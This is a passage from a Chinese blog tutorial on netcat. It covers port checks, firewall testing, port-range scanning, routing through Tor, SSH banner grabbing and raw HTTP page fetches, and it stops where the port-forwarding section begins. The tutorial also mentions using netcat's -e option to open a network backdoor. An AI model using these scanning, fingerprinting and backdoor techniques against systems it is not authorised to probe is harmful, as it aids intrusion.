# 扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵” 

-----

<div class="post-body entry-content">
　　<b>先插播一个“广而告之”</b><br/>
　　马上要到【十一沦陷日】，而且这次是朝廷的70大寿。按照以往的经验，GFW 会加大封锁力度。<br/>
　　再次提醒大伙儿——未雨绸缪，先做准备（具体参见今年六四之前的那篇《<a href="../../2019/06/gfw-news.md">翻墙快报</a>》）<br/>
<br/>
<hr/><br/>
<h2>★引子</h2><br/>
　　这些年来，俺在博客上写了若干“信息安全教程”，其中不免会涉及到【网络配置】。<br/>
　　由于读者中有很多是“技术菜鸟”，经常在配置网络的时候卡壳——有些人是因为粗心，还有些是被系统的防火墙干扰了（误导了）。<br/>
　　今天这篇，一个主要目的就是：教你如何用 netcat 这个牛逼的小工具进行网络诊断、网络配置、系统管理 ......<br/>
　　此文的另一个目的是：介绍黑客/骇客是如何利用 netcat 这个工具来辅助入侵。所谓【知己知彼】，注重安全防范的同学，也应该稍微了解一些入侵者的手法。<br/>
<a name="more"></a><br/>
<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">---------------------
|      /\_/\        |
|     / 0 0 \       |
|    ====v====      |
|     \  W  /       |
|     |     |     _ |
|     / ___ \    /  |
|    / /   \ \  |   |
|   (((-----)))-'   |
|    /              |
|   (      ___      |
|    \__.=|___E     |
|           /       |
---------------------
</pre><br/>
<h2>★netcat 是个啥玩意儿？</h2><br/>
　　netcat 一般简称为 nc，直译为中文就是“网猫”，被誉为——【<b>网络上的瑞士军刀</b>】。<br/>
　　它诞生于1995年，在网络安全社区的名气很大（就如同 AK47 在军事领域的名气）。长期在安全圈内混的人，应该都知道它。想当年，insecure.org 网站在本世纪初搞过几次“年度投票”，评选优秀的安全工具。每次投票，netcat 都能排进前几名。<br/>
　　关于 nc 的更多介绍，请参见维基百科的“<a href="https://en.wikipedia.org/wiki/Netcat" rel="nofollow" target="_blank">这个链接</a>”。<br/>
<br/>
<a name="summary"> </a><br/>
<h2>★netcat 能干啥？</h2><br/>
<h3>◇概述</h3><br/>
　　简而言之，nc 是一个【命令行】工具，能够让你很方便、很灵活地地操纵【传输层协议】（TCP ＆ UDP）。<br/>
　　考虑到本文的读者中，有些是技术菜鸟，<b>稍微普及一个小知识</b>：<br/>
<br/>
<center>================================  华丽的分割线 ================================</center><br/>
　　在谈到“网络协议分层”这个话题时，有一个大名鼎鼎的“OSI 7层模型”（维基百科的链接在“<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B" rel="nofollow" target="_blank">这里</a>”）。这个模型相当牛逼，任何一种具体的网络协议实现，都可以套用其中。<br/>
　　在如今这个互联网时代，大伙儿经常听说的“TCP/IP 协议”以及周边的协议，也可以套用到“OSI 7层模型”之上。大致如下：<br/>
<br/>
<center><table border="1" cellpadding="3" cellspacing="0"><tbody>
<tr style="background:lightgrey;"><th>层次</th><th>名称</th><th>协议举例</th></tr>
<tr><td>7</td><td>应用层</td><td>（注：位于这层的协议非常多。<br/>
比如：HTTP、DNS、FTP、SMTP、POP3、SSH ......<br/>
与用户直接打交道的，大都在这层）</td></tr>
<tr><td>6</td><td>表示层</td><td>（注：这层的协议很少见，此处省略）</td></tr>
<tr><td>5</td><td>会话层</td><td>SOCKS（代理）<br/>
PPTP（常用于：VPN）<br/>
命名管道（常用于：进程间通讯）<br/>
NetBIOS</td></tr>
<tr><td>4</td><td>传输层</td><td>TCP（传输控制协议）<br/>
UDP（数据报协议）</td></tr>
<tr><td>3</td><td>网络层</td><td>IP（互联网协议）<br/>
ICMP（互联网控制消息协议）<br/>
IGMP（互联网组管理协议）<br/>
IPSec（常用于：VPN）</td></tr>
<tr><td>2</td><td>链路层</td><td>MAC（常用于：以太网、移动通讯、等）<br/>
ARP ＆ RARP（MAC 地址的解析与反向解析）<br/>
SLIP、PPP、PPPoE（常用于：拨号上网）<br/>
L2TP（常用于：VPN）</td></tr>
<tr><td>1</td><td>物理层</td><td>USB 协议<br/>
蓝牙协议<br/>
RS-232（串口标准协议）<br/>
</td></tr>
</tbody></table></center><br/>
<center>================================  华丽的分割线 ================================</center><br/>
　　基于上述“小知识”，当你听到“IP 地址”这个词的时候，指的是“OSI 第3层”；相应的，“MAC 地址”指的是“OSI 第2层”。<br/>
<br/>
<h3>◇nc 的变种</h3><br/>
　　由于 nc 是如此牛逼，而它本身又很小（不但软件很小，源代码也很少）。很容易就衍生出一大堆【变种】。不同的变种，会在原有 nc 的基础上增加一些新功能。<br/>
　　由于变种之间存在差异。在本文的开头部分，俺有必要先声明一下：<b>这篇教程的内容，主要基于 OpenBSD 社区的变种</b>（也叫“OpenBSD netcat”或“netcat-openbsd”）<br/>
　　顾名思义，这是由 OpenBSD 社区重写的 netcat，主要增加了对“IPv6、proxy、Unix sockets”等功能的支持。另外，在细节上也有若干完善。<br/>
　　虽然它出自 OpenBSD 社区，但很多主流 Linux 发行版的官方软件仓库已包含这个变种（比如说：Debian 家族、Arch 家族、openSUSE 家族、Gentoo 家族......）。<br/>
　　“OpenBSD netcat”官网的帮助页面在“<a href="https://man.openbsd.org/nc.1" rel="nofollow" target="_blank">这里</a>”，其官方代码仓库在“<a href="https://github.com/openbsd/src/blob/master/usr.bin/nc/netcat.c" rel="nofollow" target="_blank">这里</a>”。截止俺写本文时，其版本为 1.206，上个月刚更新（看 commit history，更新还挺勤快滴）<br/>
　　为了打字省力，本文后续部分提到的 nc，除非专门注明，否则都是指：netcat 的 OpenBSD 变种。如果俺要称呼原始的那个 netcat，俺会称之为“原版 nc”（洋文叫做“traditional netcat”）。<br/>
　　另，<br/>
　　在本文末尾，俺单独开一个章节，简单聊聊 nc 的其它几个变种。<br/>
<br/>
<a name="command"> </a><br/>
<h2>★nc 命令行简介</h2><br/>
　　要使用 nc，你就需要在【命令行】中与它打交道（它所有的功能，都以命令行的方式呈现给你用）。<br/>
<br/>
<h3>◇nc 命令行的常规形式</h3><br/>
　　一般来说，nc 的命令行包括如下几个部分：<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc 命令选项 主机 端口</pre>　　<b>命令选项</b><br/>
　　这部分可能包含 0~N 个选项<br/>
　　（注：这部分最复杂，下一个小节单独聊）<br/>
　　<b>主机</b><br/>
　　这部分可能没有，可能以“点分十进制”形式表示，也可能以“域名”形式表示。<br/>
　　<b>端口</b><br/>
　　这部分可能没有，可能是单个端口，可能是端口范围。<br/>
　　对于“端口范围”，以两个数字分别表示“开始和结束”，中间以【半角减号】相连。举例：<code>1-1024</code><br/>
<br/>
<h3>◇何为“命令行选项”？</h3><br/>
　　简单来说，nc 提供了一大堆【命令行选项】，分别对应它提供的功能。每个选项都是“单字母”滴。有些选项需要带【选项值】，有些不需要。<br/>
　　你要使用的选项都放在 <code>nc</code> 这个命令之后，每个选项前面要有一个【半角减号】，选项之间以空格分开。<br/>
　　举例：<br/>
　　在下面这个例子中，分别用到了三个选项（<code>l、p、v</code>），其中 <code>12345</code> 是选项 <code>p</code> 所带的【选项值】。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -l -p 12345 -v</pre><br/>
　　如果你的系统中已经有 nc（且 nc 已添加到【PATH 环境变量】），在命令行中执行如下，就可以看到它支持的全部命令选项的列表。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -h</pre><br/>
　　顺便说一下：在上述命令的输出中，如果第一行包含 <code>OpenBSD</code> 这个单词，就说明你当前用的“网猫”是 OpenBSD 变种。<br/>
<br/>
<h3>◇【常用的】命令行选项</h3><br/>
　　由于上述命令显示的帮助是洋文。为了照顾新手，俺稍作解释（只列出【常用的】那些）。<br/>
<center><table border="1" cellpadding="3" cellspacing="0"><tbody>
<tr style="background:lightgrey;"><th>选项</th><th>是否有“选项值”</th><th>说明</th></tr>
<tr><td>h</td><td>NO</td><td>输出 nc 的帮助</td></tr>
<tr><td>v</td><td>NO</td><td>在网络通讯时，显示详细的输出信息<br/>
注：建议新手多用该选项，出错时帮你诊断问题</td></tr>
<tr><td>n</td><td>NO</td><td>对命令行中的“主机”，【不】进行域名解析<br/>
注：如果“主机”是“点分格式”的 IP 地址，需要用该选项；<br/>
如果“主机”是“域名”形式，【不能】用该选项</td></tr>
<tr><td>p</td><td>YES</td><td>指定“端口号”</td></tr>
<tr><td>l</td><td>NO</td><td>开启“监听模式”，nc 作为【服务端】<br/>
注：如不加该选项，nc 默认作为客户端</td></tr>
<tr><td>u</td><td>NO</td><td>使用 UDP 协议<br/>
注：如不加该选项，默认是 TCP 协议</td></tr>
<tr><td>w</td><td>YES</td><td>设置连接的超时间隔（N 秒）</td></tr>
<tr><td>q</td><td>YES</td><td>让 nc 延时（N 秒）再退出</td></tr>
<tr><td>z</td><td>NO</td><td>开启“zero-I/O 模式”<br/>
注：该选项仅用于“端口扫描”，后面会聊到</td></tr>
<tr><td>k</td><td>NO</td><td>配合 <code>-l</code> 选项使用，可以重复接受客户端连接。<br/>
注：“原版 nc”的该选项用来开启“TCP keepalive”<br/>
这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td></tr>
<tr><td>X</td><td>YES</td><td>指定代理的类型（具体用法，后面会聊到）<br/>
注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td></tr>
<tr><td>x</td><td>YES</td><td>以 <code>IP:port</code> 的格式指定代理的位置。<br/>
注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td></tr>
<tr><td>e</td><td>YES</td><td>启动某个进程，把该进程的“标准输入输出”与网络通讯【对接】<br/>
注：通常用该选项开启一个网络后门<br/>
“OpenBSD 变种”基于安全考虑，已去掉该选项，<br/>
但还是能用间接的方式达到同样的效果 :)</td></tr>
</tbody></table></center><br/>
　　汇总上述表格，只是用来【速查】。俺会在后续章节具体介绍每个命令选项的详细用法。<br/>
<br/>
<h3>◇命令行选项的【合写】形式</h3><br/>
　　有时候要同时用到多个选项，可以“合写在一起”，在前面共用一个【半角减号】。<br/>
　　还拿刚才俺举的例子，以下几种写法是【等价】滴。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -lp 12345 -v
nc -l -v -p 12345
nc -lv -p 12345
nc -lvp 12345</pre><br/>
<h3>◇如何强行终止 nc？</h3><br/>
　　一般来说，在命令行环境下，你可以用【Ctrl C】这个组合键来强行终止当前运行的进程。<br/>
　　对 nc，你同样可以这么干。<br/>
<br/>
<a name="tricks1"> </a><br/>
<h2>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达</h2><br/>
<h3>◇使用场景</h3><br/>
　　经常有这种需求，要判断某个主机的监听端口是否能连上。<br/>
　　导致监听端口【无法】，通常有两种原因：<br/>
其一，这个监听端口根本就【没开启】；<br/>
其二，监听端口虽然开启，但是被防火墙阻拦了。<br/>
　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 <code>netstat</code> 这个命令查看监听端口是否开启（不懂 <code>netstat</code> 命令的同学，可以看<a href="../../2013/01/cross-host-use-gfw-tool.md">这篇博文</a>）<br/>
　　但对于第2个原因，<code>netstat</code> 就用不上了。这时候就可以用 nc 来帮你搞定。<br/>
<br/>
<h3>◇方法</h3><br/>
　　用如下命令可以测试某个 IP 地址（<code>x.x.x.x</code>）上的某个监听端口（<code>xx</code>）是否开启。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -nv x.x.x.x xx</pre><br/>
　　上述命令用到了如下几个选项：<br/>
<br/>
　　<b>选项 <code>-v</code></b><br/>
　　如果你是 nc 的新手，俺建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。<br/>
　　在本文后续的举例中，俺会尽量都加上这个选项（但这段话就不再重复唠叨啦）<br/>
<br/>
　　<b>选项 <code>-n</code></b><br/>
　　由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；<br/>
　　反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。<br/>
<br/>
<h3>◇补充说明：超时设置</h3><br/>
　　在测试链接的时候，如果你【没】使用 <code>-w</code> 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。<br/>
　　如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“<code>-w</code> 选项”，设置一个比较小的超时值。在下面的例子中，超时值设为3秒。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -nv -w 3 x.x.x.x xx</pre><br/>
<h3>◇补充说明：UDP</h3><br/>
　　通常情况下，要测试的端口都是 TCP 协议的端口；如果你碰到特殊情况，需要测试某个 UDP 的端口是否可达。nc 同样能胜任。只需要追加 <code>-u</code> 选项。<br/>
<br/>
<a name="tricks2"> </a><br/>
<h2>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口</h2><br/>
<h3>◇使用场景</h3><br/>
　　前一个章节（招数1）的场景是——已经有某个网络软件开启了监听端口，然后用 nc 测试端口是否可达。<br/>
　　现在换另一个场景：<br/>
　　假设你正在配置防火墙规则，禁止 TCP 的 <code>8080</code> 端口对外监听。那么，你如何【验证】自己的配置是 OK 滴？<br/>
　　更进一步说：如果当前【没有】任何软件开启 <code>8080</code> 这个监听端口，你如何判断：该端口号是否会被防火墙阻拦？<br/>
　　为了叙述方便，设想如下场景：<br/>
有两台主机——“主机C”充当客户端，“主机S”充当服务端。<br/>
然后要判断“主机S”上的防火墙是否会拦截其它主机对 <code>8080</code> TCP 端口的连接。<br/>
<br/>
<h3>◇方法</h3><br/>
　　在“主机S”上运行 nc，让它在 8080 端口，命令如下：<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -lv -p 8080</pre><br/>
　　<b>选项 <code>-l</code></b><br/>
　　这个选项会让 nc 进入监听模式。<br/>
<br/>
　　<b>选项 <code>-p</code></b><br/>
　　这个选项有“选项值”，也就是具体端口号。<br/>
<br/>
　　然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达（具体的命令行参见前一章节“招数1”）<br/>
<br/>
<h3>◇补充说明：是否省略“-p”？</h3><br/>
　　某些 nc 的变种，在开启监听模式时，可以省略“<code>-p</code>”，上述命令变为如下：<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -lv 8080</pre>　　但考虑到兼容性，（在后续章节中）俺总是写上 <code>-p</code> 选项。<br/>
<br/>
<h3>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><br/>
　　在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。<br/>
　　为啥会这样捏？因为当年设计 nc 更多的是作为某种网络诊断/配置工具，并【不是】真拿它当服务端软件来用的。<br/>
　　如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 <code>-k</code> 选项。<br/>
<br/>
<h3>◇补充说明：UDP</h3><br/>
　　上述举例是基于 TCP 协议。如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 <code>-u</code> 选项。<br/>
<br/>
<a name="tricks3"> </a><br/>
<h2>★招数3：（渗透测试）用 nc 玩“端口扫描”</h2><br/>
<h3>◇使用场景</h3><br/>
　　在“招数1”里面介绍了：如何测试【单个】端口是否可达。<br/>
　　扩展一下：如果你要测试的不止一个端口，而是某个【范围】的端口。这种行为有个专门的术语叫【端口扫描】。<br/>
　　“端口扫描”是一把双刃剑——“黑帽子”用这招进行信息收集，为后续的入侵做铺垫；“白帽子”用这招来进行“渗透测试”，以排查自己系统中【尚未屏蔽】的对外监听端口。<br/>
　　作为一款牛逼的网络瑞士军刀，nc 当然可以用来干这事儿啦。<br/>
　　顺便说一下：<br/>
不论是 TCP 还是 UDP，协议规定的【有效】端口号范围都是：<code>1</code> ~ <code>65535</code><br/>
<br/>
<h3>◇方法</h3><br/>
　　下面这个命令，用来扫描 IP 地址为 <code>x.x.x.x</code> 的主机，扫描的端口范围从 <code>1</code> 到 <code>1024</code><br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -znv x.x.x.x 1-1024</pre><br/>
　　<b>选项 <code>-z</code></b><br/>
　　意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。<br/>
　　<b>选项 <code>-n</code></b><br/>
　　（前面已聊过，参见“招数1”）<br/>
　　<b>选项 <code>-v</code></b><br/>
　　<code>-v</code> 选项前面也聊过，这里要特地强调一下。<br/>
　　对 nc 的其它用法，<code>-v</code> 选项是可加可不加滴；但对于“端口扫描”而言，一定要有这个选项——否则你【看不到】扫描结果。<br/>
<br/>
<h3>◇补充说明：优化输出</h3><br/>
　　玩“端口扫描”的时候，“<code>-v</code> 选项”会把“成功/失败”的结果统统打印出来。<br/>
　　通常大伙儿关注的都是“扫描成功”的那些端口。因此，可以用如下命令过滤一下，只打印扫出来的端口。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -znv x.x.x.x 1-1024  2&gt;&amp;1 | grep succeeded</pre>　　由于“<code>-v</code> 选项”产生的输出位于【stderr】，上述命令中的 <code>2&gt;&amp;1</code> 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）<br/>
　　<code>grep</code> 命令用来进行【过滤】。对于 Windows 系统，默认【没有】<code>grep</code> 命令，需改用 <code>find</code> 命令过滤。<br/>
<br/>
<h3>◇补充说明：超时设置</h3><br/>
　　如果你要扫描的端口范围，跨度比较大，超时值要【恰到好处】——<br/>
超时值太大，会浪费时间；超时值太小，可能会遗漏某些端口（端口本身开放，但 nc 还没来得及连上就超时了）<br/>
　　具体如何设置，参见“招数1”的“补充说明”。<br/>
<br/>
<h3>◇补充说明：【并发】扫描</h3><br/>
　　如果你设置了较小的超时值，依然嫌慢，还可以用【并发】扫描的方式，进一步提升效率。<br/>
　　简而言之就是：同时运行多个 nc，分别扫描不同的端口范围。<br/>
<br/>
<a name="tricks4"> </a><br/>
<h2>★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）</h2><br/>
<h3>◇使用场景</h3><br/>
　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br/>
　　如果你想用 nc 干一些“不为人知”的事情，首先要考虑的是——如何消除【网络层面】的踪迹。<br/>
　　最容易想到的当然就是——让 nc 走暗网（比如 Tor）。本文以下部分称之为【nc over Tor】。<br/>
　　顺便说一下：“原版 nc”【不支持】代理，而 nc 的“OpenBSD 变种”支持各种代理。这是两种 nc 之间的关键性差异之一。<br/>
<br/>
<h3>◇方法</h3><br/>
　　为了支持代理，nc 的“OpenBSD 变种”增加了两个选项：<code>-X</code> 与 <code>-x</code><br/>
<br/>
　　<b>选项 <code>-x</code></b><br/>
　　该选项表示【代理的位置】，以 <code>x.x.x.x:xxx</code> 的形式表示（中间是【半角冒号】）。<br/>
<br/>
　　<b>选项 <code>-X</code></b><br/>
　　该选项表示【代理的类型】，含义如下：<br/>
<center><table border="1" cellpadding="3" cellspacing="0"><tbody>
<tr style="background:lightgrey;"><th>选项值</th><th>含义</th></tr>
<tr><td>5</td><td>SOCKS5 代理</td></tr>
<tr><td>4</td><td>SOCKS4 代理</td></tr>
<tr><td>connect</td><td>CONNECT 型的 HTTP 代理</td></tr>
</tbody></table></center>　　上述这几种类型的代理，功能上有啥差异，参见下面这篇博文开头部分的<q style="background-color:#DDD;">★预备知识</q>章节。<br/>
《<a href="../../2019/04/Proxy-Tricks.md">如何让【不支持】代理的网络软件，通过代理进行联网（不同平台的 N 种方法）</a>》<br/>
<br/>
　　首先，确保你本机已经运行了 Tor；<br/>
　　然后，拿俺的域名测试一下。如果 nc 的输出中包含 <code>succeeded</code>（参见下面的第2行），说明 OK 啦——nc 已经能通过 Tor 联网。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -X 5 -x 127.0.0.1:9050 -q 3 -v program-think.blogspot.com 443

Connection to program-think.blogspot.com 443 port [tcp/https] succeeded!
</pre>（注：如果你用的是“Tor Browser”，上述命令中的“<code>-x</code> 选项值”改为 <code>127.0.0.1:9150</code>）<br/>
<br/>
<h3>◇补充说明：延时退出</h3><br/>
　　在上述举例中，俺用到了一个新的 <code>-q</code> 选项。主要考虑到：本博客的 Web Server 位于【公网】。<br/>
　　当你用 nc 连接【公网】上的服务器，考虑到网络环境的诸多因素，最好加 <code>-q</code> 选项，让 nc【延时】退出。<br/>
　　在俺的示例中，延时3秒。实际操作时，要根据你的网络环境调整。<br/>
<br/>
<h3>◇补充说明：Tor 暗网的好处</h3><br/>
　　关于 Tor 的用处/好处，俺在博客上重复唠叨的次数，已经数不清了。<br/>
　　（简而言之）由于 Tor 暗网的线路会经历“三级跳”＆“三重套”，而且其线路每隔10分钟就会【随机】变换一次。这种变态的玩法，可以让【网络层面】的逆向追溯变得非常非常困难。<br/>
　　对这方面的更多介绍，参见：《<a href="../../2013/11/tor-faq.md">关于 Tor 的常见问题解答</a>》<br/>
<br/>
<h3>◇补充说明：域名解析</h3><br/>
　　当你用刚才的招数做到【nc over Tor】之后，一旦 nc 的网络行为需要解析域名，会自动通过 Tor 的 SOCKS 代理进行【远程域名解析】。<br/>
　　也就是说，“DNS 协议”相关数据流也经过 Tor 暗网——这样既可以【防止】“域名解析”暴露你的网络行为，还可以避免 GFW 的“域名污染”。<br/>
　　关于“DNS 协议”的引申阅读，可以看如下几篇：<br/>
《<a href="../../2014/01/dns.md">扫盲 DNS 原理，兼谈“域名劫持”和“域名欺骗／域名污染”</a>》<br/>
《<a href="../../2018/10/Comparison-of-DNS-Protocols.md">对比4种强化域名安全的协议——DNSSEC，DNSCrypt，DNS over TLS，DNS over HTTPS</a>》<br/>
<br/>
<h3>◇补充说明：设置别名（alias）</h3><br/>
　　如果你比较懒，觉得每次都输入上述两个代理选项太麻烦，可以为 nc 设置一个【别名】（命令如下）<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">alias nc-tor='nc -X 5 -x 127.0.0.1:9050'</pre>　　设置好之后，你只要用 <code>nc-tor</code> 就可以自动追加代理选项。<br/>
　　如果想让别名【永久】生效，要把上述命令加入到：你当前使用的 shell 的启动文件中。<br/>
　　再次唠叨：“裸 Tor”与“Tor Browser”的监听端口有差异。俺上述命令的 <code>9050</code> 是用于“裸 Tor”。<br/>
<br/>
<a name="tricks5"> </a><br/>
<h2>★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）</h2><br/>
<h3>◇使用场景</h3><br/>
　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br/>
　　入侵者在发起攻击之前，有一个很重要的步骤叫做【信息收集】。攻击者对目标了解得越多，得手的机会就越大。<br/>
　　下面俺以 SSH Server（sshd）举例。<br/>
<br/>
<h3>◇方法</h3><br/>
　　如今要【远程管理】服务器，最常用的大概就是 SSH 这种方式了。<br/>
　　如果某个服务器运行了 SSH 服务端（默认监听端口是 <code>22</code>），那么用如下命令可以看出：该服务器的操作系统类型，以及 SSH server 的版本。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">echo "EXIT" | nc-tor -vq 5 -n 服务器IP 22
echo "EXIT" | nc-tor -vq 5 服务器域名 22
</pre><br/>
　　<b>选项 <code>-v</code></b><br/>
　　玩这招时，最好加 <code>-v</code> 选项——nc 会先显示“端口已经连上”或者“端口连不上”。<br/>
<br/>
　　<b>选项 <code>-q</code></b><br/>
　　（关于该选项的说明，参见“招数4”章节的【延时退出】）<br/>
<br/>
　　<b><code>nc-tor</code> 别名</b><br/>
　　（关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理）<br/>
<br/>
　　前面聊了这么久，一直没有给出【实例】。现在来一个【真实的】例子——用 nc 探测 Github 的 SSH 端口<br/>
　　（注：在如下终端窗口中，头一行是命令，后面两行是输出）<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">echo "EXIT" | nc-tor -vq 5 ssh.github.com 22

Connection to ssh.github.com 22 port [tcp/ssh] succeeded!
SSH-2.0-babeld-dae25663
</pre><br/>
<h3>◇补充说明：echo 命令</h3><br/>
　　上述用到的 <code>echo</code> 命令是 POSIX 下常用的命令。Windows 的命令行中也有同名的命令，但功能/用法有【差异】。<br/>
<br/>
<h3>◇补充说明：批处理 ＆ 自动化</h3><br/>
　　某些“有心人”甚至可以搞一个脚本，批量探测某个 IP 地址段的 22 端口，然后把找到的服务器信息保存在某个文件中。<br/>
　　另外，<br/>
　　有的系统管理员会把 sshd 的监听端口从 <code>22</code> 改为其它数值，想要迷惑攻击者。但这么干，【效果不大】。<br/>
　　攻击者可以先进行端口扫描，拿到所有已开启的 TCP 监听端口；然后利用上述方法，对这些 TCP 端口进行【自动化】探测，从而判断出哪个端口是 SSH Server。<br/>
<br/>
<h3>◇补充说明：防范措施</h3><br/>
　　本章节以“SSH Server”举例来说明入侵者如何探测服务端的软件版本。<br/>
　　除了“SSH Server”，很多其它的服务端软件，也存在类似的【信息暴露】。<br/>
　　一个谨慎的系统管理员，应该通过定制，【消除 or 伪造】这些信息，从而增加入侵者的攻击成本。<br/>
<br/>
<a name="tricks6"> </a><br/>
<h2>★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问</h2><br/>
<h3>◇使用场景</h3><br/>
　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br/>
　　有时候，俺想要看某个 Web 服务器上的某个页面的内容，但是又【不希望】在那上面留下俺本人的任何痕迹。这里所说的“痕迹”既包括【网络】层面滴，也包括【操作系统 ＆ 软件】层面滴。<br/>
　　要搞定【网络】层面，很简单——主要靠【暗网】（Tor or I2P），来掩盖你的【真实】“公网 IP”。具体的玩法，前面章节已经聊过啦。<br/>
　　要搞定【操作系统 ＆ 软件】层面，稍微麻烦一点。如果你用传统的浏览器（Chrome、Firefox、IE、Edge ...）访问了某个页面。即使你禁用了 JS，伪造了浏览器的“User Agent”。但如果 Web 服务器想要收集你的系统指纹，还是有若干办法——可以通过浏览器的一些差异，获得某些信息量（安全行话叫做“浏览器指纹”）。<br/>
　　比如说：HTTP 协议的【Header】字段可能会包含某些信息。<br/>
　　比如说：不同内核的浏览器，对页面的渲染会有差异。对页面中的【外部】元素（图片、JS、CSS ...）的加载效率也会有差异。<br/>
　　比如说：即使同一款浏览器，在不同系统平台上，依然会表现出某些差异。<br/>
　　......<br/>
　　引申阅读：<br/>
关于“浏览器指纹”的深入讨论，可以看《<a href="../../2013/06/privacy-protection-0.md">如何保护隐私</a>》系列教程的其中几篇。<br/>
<br/>
　　此时，nc 再度派上用场——你可以用 nc 直接抓取页面，保存到本机。<br/>
　　这种玩法相当于——让 nc 在【裸 TCP】层面执行 HTTP 协议的命令。在整个过程中，浏览器完全【不】参与其中。既【不会】暴露浏览器的信息，也【不会】暴露操作系统的信息。<br/>
<br/>
<h3>◇方法</h3><br/>
　　先执行下列两个命令的其中一个（具体看你想用“IP”还是“域名”）<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">echo -e "GET / HTTP/1.0\r\n\r\n" | nc-tor -vq 5 服务器域名 端口
echo -e "GET / HTTP/1.0\r\n\r\n" | nc-tor -vq 5 -n 服务器IP 端口
</pre><br/>
　　然后 nc 就会把这个页面抓下来，打印到命令行终端。这时候你看到的是【HTML 源代码】。<br/>
<br/>
　　上述命令访问的是 Web Server 的【根路径】。如果你想要看其它路径的页面（比如说：<code>/index.html</code>），稍微修改成如下：<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">echo -e "GET /index.html HTTP/1.0\r\n\r\n" | nc-tor -vq 5 服务器域名 端口
echo -e "GET /index.html HTTP/1.0\r\n\r\n" | nc-tor -vq 5 -n 服务器IP 端口
</pre><br/>
　　由于正常人类是无法直接阅读【HTML 源代码】滴。为了更加人性化，你可以把 nc 抓下来的 HTML 源代码，（在命令行中用“大于号”）重定向到某个 HTML 文件，然后就可以用你本机的浏览器阅读之。<br/>
<br/>
　　<b><code>nc-tor</code> 别名</b><br/>
　　（关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理）<br/>
<br/>
　　<b>选项 <code>-q</code></b><br/>
　　（关于该选项的说明，参见“招数4”章节的【延时退出】）<br/>
<br/>
<h3>◇补充说明：HTTP 协议</h3><br/>
　　<b>协议版本</b><br/>
　　有些同学会奇怪——为啥俺上述的示例用的是 1.0 而不是 1.1？<br/>
　　主要是为了偷懒——按照 RFC 的规范，HTTP 1.1 的 Request 中，<code>Host</code> 是【必须】的字段；而在 HTTP 1.0 中，这个字段是【可选】滴。<br/>
<br/>
　　<b>HTTPS</b><br/>
　　nc 的“OpenBSD 变种”还【不】支持 HTTPS（SSL/TLS）。<br/>
　　在本文末尾介绍的其它变种里面，ncat ＆ socat 已经完全支持 SSL/TLS 协议。<br/>
　　由于本文主要介绍 nc 的“OpenBSD 变种”，关于 ncat ＆ socat 的话题，就不展开啦。<br/>
<br/>
<h3>◇补充说明：这种方式的【缺点】</h3><br/>
　　<b>关于“页面的【外部】元素”</b><br/>
　　用这招，nc 只抓取页面本身，不包括页面中的外部元素（图片、JS、CSS ...）。<br/>
　　这种方式拿到的页面，阅读的时候会显得比较丑陋（你就凑合着看吧）<br/>
<br/>
　　<b>关于“JS 引擎”</b><br/>
　　由于这招只是在 TCP 层面模拟了简单的 HTTP 协议。所以只能得到【静态 HTML】。<br/>
　　如果某个页面的内容是依靠【前端 JS】动态生成（所谓的 AJAX 风格），那这招就不灵啦（因为 nc【没有】JS 引擎）。<br/>
<br/>
<a name="tricks7"> </a><br/>
<h2>★招数7：（网络配置）基于 nc 的端口转发（Port Forward）</h2><br/>
<h3>◇使用场景</h3><br/>
　　说到【端口转发】，俺在6年前（2013）已经专门写过一篇扫盲教程（如下）。<br/>
《<a href="../../2013/01/cross-host-use-gfw-tool.md">多台电脑如何【共享】翻墙通道——兼谈【端口转发】的几种方法</a>》<br/>
